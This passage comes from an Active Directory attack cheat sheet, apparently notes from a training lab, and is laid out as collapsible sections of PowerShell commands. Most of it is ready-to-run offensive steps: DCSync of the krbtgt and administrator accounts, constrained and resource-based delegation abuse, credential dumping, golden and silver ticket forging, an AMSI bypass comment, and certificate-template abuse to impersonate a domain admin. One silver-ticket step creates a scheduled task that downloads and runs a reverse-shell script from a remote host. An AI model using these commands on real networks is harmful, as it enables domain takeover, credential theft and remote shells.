      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\MS-RPRN.exe</span><span class="w"> </span><span class="nx">\\dc.domain.local</span><span class="w"> </span><span class="nx">\\us-web.domain.local</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Copy the Base64EncodedTicket, then</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">ptt</span><span class="w"> </span><span class="nx">/ticket:TGTofDC</span><span class="err">$</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Run DCSync attack</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\SharpKatz.exe</span><span class="w"> </span><span class="nt">--Command</span><span class="w"> </span><span class="nx">dcsync</span><span class="w"> </span><span class="nt">--User</span><span class="w"> </span><span class="nx">domain\krbtgt</span><span class="w"> </span><span class="nt">--Domain</span><span class="w"> </span><span class="nx">domain.local</span><span class="w"> </span><span class="nt">--DomainController</span><span class="w"> </span><span class="nx">dc.domain.local</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>To get EA access</strong></p>

      <p>it’s the same:</p>

      <ol>
        <li>Monitor the DC of the root of the forest</li>
        <li>Execute MS-RPRN with the DC target</li>
        <li>Copy the Base64 and PTT</li>
        <li>DCSync EA (Administrator of the root forest)</li>
      </ol>

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\SharpKatz.exe</span><span class="w"> </span><span class="nt">--Command</span><span class="w"> </span><span class="nx">dcsync</span><span class="w"> </span><span class="nt">--User</span><span class="w"> </span><span class="nx">domain\administrator</span><span class="w"> </span><span class="nt">--Domain</span><span class="w"> </span><span class="nx">domain.local</span><span class="w"> </span><span class="nt">--DomainController</span><span class="w"> </span><span class="nx">domain-dc.domain.local</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>In a different forest</strong></p>

      <blockquote>
        <p>If TGT Delegation is enabled across forests trusts, we can abuse the printer bug across two-way forest trusts as well.</p>
      </blockquote>

      <ol>
        <li>ASKTGT</li>
        <li>Send Rubeus to the target machine</li>
        <li>Access the machine with WINRS</li>
        <li>Execute Rubeus monitor (with the Target Forest)</li>
        <li>Execute MS-RPRN (with the Target Forest)</li>
        <li>Copy base64 &amp; PTT with Rubeus</li>
      </ol>

      <p><strong>Now we can run DCSync to the Targeted Forest</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\SharpKatz.exe</span><span class="w"> </span><span class="nt">--Command</span><span class="w"> </span><span class="nx">dcsync</span><span class="w"> </span><span class="nt">--User</span><span class="w"> </span><span class="nx">usvendor\krbtgt</span><span class="w"> </span><span class="nt">--Domain</span><span class="w"> </span><span class="nx">usvendor.local</span><span class="w"> </span><span class="nt">--DomainController</span><span class="w"> </span><span class="nx">usvendor-dc.usvendor.local</span><span class="w">
</span></code></pre></div>      </div>

    </div>
  </details>

  <details>
    <summary>Constrained delegation</summary>
    <div class="content">
      <p> </p>

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADObject</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="p">{</span><span class="n">msDS-AllowedToDelegateTo</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="s2">"</span><span class="bp">$null</span><span class="s2">"</span><span class="p">}</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="n">msDS-AllowedToDelegateTo</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Collect the service from msDS-AllowedToDelegateTo and access with Rubeus S4U</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">klist</span><span class="w">
</span><span class="nx">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">us-mssql.domain.local</span><span class="w"> </span><span class="nx">cmd.exe</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>To execute on another Forest just add the flag -Server</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADObject</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="p">{</span><span class="n">msDS-AllowedToDelegateTo</span><span class="w"> </span><span class="o">-ne</span><span class="w"> </span><span class="s2">"</span><span class="bp">$null</span><span class="s2">"</span><span class="p">}</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="n">msDS-AllowedToDelegateTo</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="nx">domain.local</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>We need access to the machine that has Constrained Deleg enabled</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">hash</span><span class="w"> </span><span class="nx">/password:Qwerty</span><span class="err">@</span><span class="nx">123</span><span class="w"> </span><span class="nx">/user:</span><span class="err">&lt;</span><span class="nx">user</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/domain:domain.local</span><span class="w">
</span><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">s4u</span><span class="w"> </span><span class="nx">/user:</span><span class="err">&lt;</span><span class="nx">user</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/rc4:</span><span class="err">&lt;</span><span class="nx">hash</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/impersonateuser:Administrator</span><span class="w"> </span><span class="nx">/domain:domain.local</span><span class="w"> </span><span class="nx">/msdsspn:nmagent/dc.domain.local</span><span class="w"> </span><span class="nx">/altservice:ldap</span><span class="w"> </span><span class="nx">/dc:dc.domain.local</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>With the LDAP service ticket, We can DCSync</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\SharpKatz.exe</span><span class="w"> </span><span class="nt">--Command</span><span class="w"> </span><span class="nx">dcsync</span><span class="w"> </span><span class="nt">--User</span><span class="w"> </span><span class="nx">domain\krbtgt</span><span class="w"> </span><span class="nt">--Domain</span><span class="w"> </span><span class="nx">domain.local</span><span class="w"> </span><span class="nt">--DomainController</span><span class="w"> </span><span class="nx">dc.domain.local</span><span class="w">
</span><span class="n">C:\AD\Tools\SharpKatz.exe</span><span class="w"> </span><span class="nt">--Command</span><span class="w"> </span><span class="nx">dcsync</span><span class="w"> </span><span class="nt">--User</span><span class="w"> </span><span class="nx">domain\administrator</span><span class="w"> </span><span class="nt">--Domain</span><span class="w"> </span><span class="nx">domain.local</span><span class="w"> </span><span class="nt">--DomainController</span><span class="w"> </span><span class="nx">dc.domain.local</span><span class="w">
</span></code></pre></div>      </div>

    </div>
  </details>

  <details>
    <summary>ACLs Write Permissions</summary>
    <div class="content">

      <p><strong>If you have Write permission</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">C:\AD\Tools\Loader.exe</span><span class="w"> </span><span class="nx">\\us-mgmt\C</span><span class="err">$</span><span class="nx">\Users\Public\Loader.exe</span><span class="w"> </span><span class="nx">/Y</span><span class="w">
</span><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">us-mgmt</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
</span><span class="n">netsh</span><span class="w"> </span><span class="nx">interface</span><span class="w"> </span><span class="nx">portproxy</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="nx">v4tov4</span><span class="w"> </span><span class="nx">listenport</span><span class="o">=</span><span class="mi">8080</span><span class="w"> </span><span class="n">listenaddress</span><span class="o">=</span><span class="mf">0.0</span><span class="o">.</span><span class="nf">0</span><span class="o">.</span><span class="nf">0</span><span class="w"> </span><span class="n">connectport</span><span class="o">=</span><span class="mi">80</span><span class="w"> </span><span class="n">connectaddress</span><span class="o">=</span><span class="mf">192.168</span><span class="o">.</span><span class="nf">100</span><span class="o">.</span><span class="nf">x</span><span class="w">
</span><span class="n">C:\Users\Public\Loader.exe</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="nx">http://127.0.0.1:8080/SafetyKatz.exe</span><span class="w">
</span><span class="n">sekurlsa::keys</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>If you get any user, run the full enumeration on that user</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\PowerView.ps1</span><span class="w">
</span><span class="nx">Find-InterestingDomainAcl</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">IdentityReferenceName</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s1">'mgmtadmin'</span><span class="p">}</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>With GenericWrite we can set Resource-based Constrained Delegation (RBCD)</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat</span><span class="w">
</span><span class="nx">Import-Module</span><span class="w"> </span><span class="nx">C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll</span><span class="w">
</span><span class="n">Import-Module</span><span class="w"> </span><span class="nx">C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1</span><span class="w">
</span><span class="nv">$comps</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'user1$'</span><span class="p">,</span><span class="s1">'user2$'</span><span class="w">
</span><span class="n">Set-ADComputer</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">us-helpdesk</span><span class="w"> </span><span class="nt">-PrincipalsAllowedToDelegateToAccount</span><span class="w"> </span><span class="nv">$comps</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Extract AES of your machine</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\SafetyKatz.exe</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s2">"sekurlsa::keys"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Go for the one with SID S-1-5-18 that is a well-known SID for the SYSTEM user</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">s4u</span><span class="w"> </span><span class="nx">/user:machine</span><span class="err">$</span><span class="w"> </span><span class="nx">/aes256:</span><span class="nv">$password</span><span class="w"> </span><span class="nx">/msdsspn:http/us-helpdesk</span><span class="w"> </span><span class="nx">/impersonateuser:administrator</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span><span class="n">klist</span><span class="w">
</span><span class="nx">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">us-helpdesk</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>To copy our loader to the machine, we need to access the filesystem. So, request a TGS for CIFS using Rubeus</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">s4u</span><span class="w"> </span><span class="nx">/user:machine</span><span class="err">$</span><span class="w"> </span><span class="nx">/aes256:</span><span class="nv">$password</span><span class="w"> </span><span class="nx">/msdsspn:cifs/us-helpdesk</span><span class="w"> </span><span class="nx">/impersonateuser:administrator</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">C:\AD\Tools\Loader.exe</span><span class="w"> </span><span class="nx">\\us-helpdesk\C</span><span class="err">$</span><span class="nx">\Users\Public\Loader.exe</span><span class="w"> </span><span class="nx">/Y</span><span class="w">
</span><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">us-helpdesk</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
</span><span class="n">netsh</span><span class="w"> </span><span class="nx">interface</span><span class="w"> </span><span class="nx">portproxy</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="nx">v4tov4</span><span class="w"> </span><span class="nx">listenport</span><span class="o">=</span><span class="mi">8080</span><span class="w"> </span><span class="n">listenaddress</span><span class="o">=</span><span class="mf">0.0</span><span class="o">.</span><span class="nf">0</span><span class="o">.</span><span class="nf">0</span><span class="w"> </span><span class="n">connectport</span><span class="o">=</span><span class="mi">80</span><span class="w"> </span><span class="n">connectaddress</span><span class="o">=</span><span class="mf">192.168</span><span class="o">.</span><span class="nf">100</span><span class="o">.</span><span class="nf">x</span><span class="w">
</span><span class="n">C:\Users\Public\Loader.exe</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="nx">http://127.0.0.1:8080/SafetyKatz.exe</span><span class="w">
</span></code></pre></div>      </div>

      <blockquote>
        <p>If any new users are found, <em>PTH and Find-PSRemotingLocalAdminAccess -Verbose</em></p>
      </blockquote>

    </div>
  </details>

  <details>
    <summary>Tickets</summary>
    <div class="content">
      <p> </p>

      <p><strong>GOLDEN</strong></p>

      <p><strong>Without using Invoke-Mimi.ps1</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\BetterSafetyKatz.exe</span><span class="w"> </span><span class="s2">"kerberos::golden /User:Administrator /domain:&lt;domain&gt; /sid:&lt;SID&gt; /aes256:&lt;hash&gt; /startoffset:0 /endin:600 /renewmax:10080 /ptt"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span><span class="n">klist</span><span class="w">
</span><span class="nx">echo</span><span class="w"> </span><span class="nx">F</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">xcopy</span><span class="w"> </span><span class="nx">C:\AD\Tools\Loader.exe</span><span class="w"> </span><span class="nx">\\dc\C</span><span class="err">$</span><span class="nx">\Users\Public\Loader.exe</span><span class="w"> </span><span class="nx">/Y</span><span class="w">
</span><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">dc</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
</span><span class="n">netsh</span><span class="w"> </span><span class="nx">interface</span><span class="w"> </span><span class="nx">portproxy</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="nx">v4tov4</span><span class="w"> </span><span class="nx">listenport</span><span class="o">=</span><span class="mi">8080</span><span class="w"> </span><span class="n">listenaddress</span><span class="o">=</span><span class="mf">0.0</span><span class="o">.</span><span class="nf">0</span><span class="o">.</span><span class="nf">0</span><span class="w"> </span><span class="n">connectport</span><span class="o">=</span><span class="mi">80</span><span class="w"> </span><span class="n">connectaddress</span><span class="o">=</span><span class="mf">192.168</span><span class="o">.</span><span class="nf">100</span><span class="o">.</span><span class="nf">x</span><span class="w">
</span><span class="n">C:\Users\Public\Loader.exe</span><span class="w"> </span><span class="nt">-path</span><span class="w"> </span><span class="nx">http://127.0.0.1:8080/SafetyKatz.exe</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Using Invoke-Mimi.ps1 and PowerShell Remoting</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">.</span><span class="w"> </span><span class="n">C:\AD\Tools\Invoke-Mimi.ps1</span><span class="w">
</span><span class="nx">Invoke-Mimi</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"kerberos::golden /User:Administrator /domain:&lt;domain&gt; /sid:&lt;SID&gt; /aes256:&lt;hash&gt; /startoffset:0 /endin:600 /renewmax:10080 /ptt"'</span><span class="w">
</span><span class="nv">$sess</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-PSSession</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">machine</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w">
</span><span class="n">Enter-PSSession</span><span class="w"> </span><span class="nt">-Session</span><span class="w"> </span><span class="nv">$sess</span><span class="w">

</span><span class="c"># bypass AMSI </span><span class="w">

</span><span class="kr">exit</span><span class="w">
</span><span class="n">Invoke-Command</span><span class="w"> </span><span class="nt">-FilePath</span><span class="w"> </span><span class="nx">C:\AD\Tools\Invoke-Mimi.ps1</span><span class="w"> </span><span class="nt">-Session</span><span class="w"> </span><span class="nv">$sess</span><span class="w">
</span><span class="n">Enter-PSSession</span><span class="w"> </span><span class="nt">-Session</span><span class="w"> </span><span class="nv">$sess</span><span class="w">
</span><span class="n">Invoke-Mimi</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"lsadump::lsa /patch"'</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>SILVER</strong></p>

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\BetterSafetyKatz.exe</span><span class="w"> </span><span class="s2">"kerberos::golden /User:Administrator /domain:&lt;domain&gt; /sid:&lt;SID&gt; /target:&lt;target&gt; /service:HOST /aes256:&lt;hash&gt; /startoffset:0 /endin:600 /renewmax:10080 /ptt"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span><span class="n">klist</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Start a listening in another prompt</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat</span><span class="w">
</span><span class="o">.</span><span class="w"> </span><span class="nx">C:\AD\Tools\powercat.ps1</span><span class="w">
</span><span class="n">powercat</span><span class="w"> </span><span class="nt">-l</span><span class="w"> </span><span class="nt">-v</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">443</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">1000</span><span class="w">
</span><span class="n">schtasks</span><span class="w"> </span><span class="nx">/create</span><span class="w"> </span><span class="nx">/S</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">target</span><span class="w"> </span><span class="nx">machine</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/SC</span><span class="w"> </span><span class="nx">Weekly</span><span class="w"> </span><span class="nx">/RU</span><span class="w"> </span><span class="s2">"NT Authority\SYSTEM"</span><span class="w"> </span><span class="nx">/TN</span><span class="w"> </span><span class="s2">"Userx"</span><span class="w"> </span><span class="nx">/TR</span><span class="w"> </span><span class="s2">"powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.100.x/Invoke-PowerShellTcpEx.ps1''')'"</span><span class="w">
</span><span class="n">schtasks</span><span class="w"> </span><span class="nx">/Run</span><span class="w"> </span><span class="nx">/S</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">target</span><span class="w"> </span><span class="nx">machine</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/TN</span><span class="w"> </span><span class="s2">"Userx"</span><span class="w">
</span></code></pre></div>      </div>

      <p>We should get a shell on the listener prompt.</p>

      <blockquote>
        <p>For <em>WMI</em>, we need 2 tickets – <em>HOST and RPCSS</em></p>
      </blockquote>

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\BetterSafetyKatz.exe</span><span class="w"> </span><span class="s2">"kerberos::golden /User:Administrator /domain:&lt;domain&gt; /sid:&lt;SID&gt; /target:&lt;target dc&gt; /service:HOST /aes256:&lt;hash&gt; /startoffset:0 /endin:600 /renewmax:10080 /ptt"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span><span class="n">C:\AD\Tools\BetterSafetyKatz.exe</span><span class="w"> </span><span class="s2">"kerberos::golden /User:Administrator /domain:&lt;domain&gt; /sid:&lt;SID&gt; /target:&lt;target dc&gt; /service:RPCSS /aes256:&lt;hash&gt; /startoffset:0 /endin:600 /renewmax:10080 /ptt"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span><span class="n">Get-WmiObject</span><span class="w"> </span><span class="nt">-Class</span><span class="w"> </span><span class="nx">win32_operatingsystem</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">computer</span><span class="w"> </span><span class="nx">name</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div>      </div>

    </div>
  </details>

  <details>
    <summary>DCSync</summary>
    <div class="content">
      <p> </p>

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat</span><span class="w">
</span><span class="o">.</span><span class="w"> </span><span class="nx">C:\AD\Tools\PowerView.ps1</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Check if the user has Replication Rights</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-DomainObjectAcl</span><span class="w"> </span><span class="nt">-SearchBase</span><span class="w"> </span><span class="s2">"dc=us,dc=domain,dc=local"</span><span class="w"> </span><span class="nt">-SearchScope</span><span class="w"> </span><span class="nx">Base</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">ObjectAceType</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s1">'replication-get'</span><span class="p">)</span><span class="w"> </span><span class="o">-or</span><span class="w"> </span><span class="p">(</span><span class="bp">$_</span><span class="o">.</span><span class="nf">ActiveDirectoryRights</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s1">'GenericAll'</span><span class="p">)}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ForEach-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Add-Member</span><span class="w"> </span><span class="nx">NoteProperty</span><span class="w"> </span><span class="s1">'IdentityName'</span><span class="w"> </span><span class="err">$</span><span class="p">(</span><span class="n">Convert-SidToName</span><span class="w"> </span><span class="bp">$_</span><span class="o">.</span><span class="nf">SecurityIdentifier</span><span class="p">);</span><span class="bp">$_</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">IdentityName</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s2">"studentuserx"</span><span class="p">}</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>With DA privileges We can add those rights</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\SafetyKatz.exe</span><span class="w"> </span><span class="s2">"sekurlsa::opassth /user:administrator /domain:domain.local /aes256:&lt;hash&gt; /run:cmd.exe"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Using Powerview</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Add-DomainObjectAcl</span><span class="w"> </span><span class="nt">-TargetIdentity</span><span class="w"> </span><span class="s2">"dc=us,dc=domain,dc=local"</span><span class="w"> </span><span class="nt">-PrincipalIdentity</span><span class="w"> </span><span class="nx">studentuserx</span><span class="w"> </span><span class="nt">-Rights</span><span class="w"> </span><span class="nx">DCSync</span><span class="w"> </span><span class="nt">-PrincipalDomain</span><span class="w"> </span><span class="nx">domain.local</span><span class="w"> </span><span class="nt">-TargetDomain</span><span class="w"> </span><span class="nx">domain.local</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>Using AD Module with Set-ADACL from RACE</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set-ADACL</span><span class="w"> </span><span class="nt">-DistinguishedName</span><span class="w"> </span><span class="s1">'DC=us,DC=domain,DC=local'</span><span class="w"> </span><span class="nt">-SamAccountName</span><span class="w"> </span><span class="nx">studentuserx</span><span class="w"> </span><span class="nt">-GUIDRight</span><span class="w"> </span><span class="nx">DCSync</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
</span></code></pre></div>      </div>

      <blockquote>
        <p>From a normal shell, check the rights again</p>
      </blockquote>

      <p><strong>Now we can execute DCSync attacks</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\SafetyKatz.exe</span><span class="w"> </span><span class="s2">"lsadump::dcsync /user:domain\krbtgt"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
</span><span class="n">Invoke-Mimi</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"lsadump::dcsync /user:domain\krbtgt"'</span><span class="w">
</span></code></pre></div>      </div>

    </div>
  </details>

  <details>
    <summary>AD CS</summary>
    <div class="content">
      <p> </p>

      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\Certify.exe</span><span class="w"> </span><span class="nx">cas</span><span class="w">
</span><span class="n">C:\AD\Tools\Certify.exe</span><span class="w"> </span><span class="nx">find</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>ENROLLEE_SUPPLIES_SUBJECT attribute means we can request a certificate for ANY user</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\Certify.exe</span><span class="w"> </span><span class="nx">find</span><span class="w"> </span><span class="nx">/enrolleeSuppliesSubject</span><span class="w">
</span><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/user:</span><span class="err">&lt;</span><span class="nx">user</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">/certificate:C:\AD\Tools\user.pfx</span><span class="w"> </span><span class="nx">/password:SecretPass</span><span class="err">@</span><span class="nx">123</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span><span class="n">C:\AD\Tools\Certify.exe</span><span class="w"> </span><span class="nx">request</span><span class="w"> </span><span class="nx">/ca:domain-DC.domain.local\DOMAIN-DC-CA</span><span class="w"> </span><span class="nx">/template:ForAdminsofPrivilegedAccessWorkstations</span><span class="w"> </span><span class="nx">/altname:Administrator</span><span class="w">
</span></code></pre></div>      </div>

      <blockquote>
        <p><em>Copy all the text between —–BEGIN RSA PRIVATE KEY—– and —–END CERTIFICATE—– and save it to cert.pem</em></p>
      </blockquote>

      <p>C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\cert.pem -keyex -CSP “Microsoft Enhanced Cryptographic Provider v1.0” -export -out C:\AD\Tools\DA.pfx</p>

      <p><strong>Finally, request a TGT for the DA</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/user:Administrator</span><span class="w"> </span><span class="nx">/certificate:C:\AD\Tools\DA.pfx</span><span class="w"> </span><span class="nx">/password:SecretPass</span><span class="err">@</span><span class="nx">123</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">dc</span><span class="w"> </span><span class="nx">whoami</span><span class="w">
</span></code></pre></div>      </div>

      <p><strong>For EA</strong></p>

      <p><strong>Request and convert to PFX, then request the TGT</strong>:</p>
      <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/user:domain.local\Administrator</span><span class="w"> </span><span class="nx">/dc:domain-dc.domain.local</span><span class="w"> </span><span class="nx">/certificate:C:\AD\Tools\EA.pfx</span><span class="w"> </span><span class="nx">/password:SecretPass</span><span class="err">@</span><span class="nx">123</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
</span><span class="n">winrs</span><span class="w"> </span><span class="nt">-r</span><span class="p">:</span><span class="nx">domain-dc</span><span class="w"> </span><span class="nx">whoami</span><span class="w">
</span></code></pre></div>      </div>

    </div>
  </details>

  <details>
    <summary>Azure AD Connect</summary>
    <div class="content">

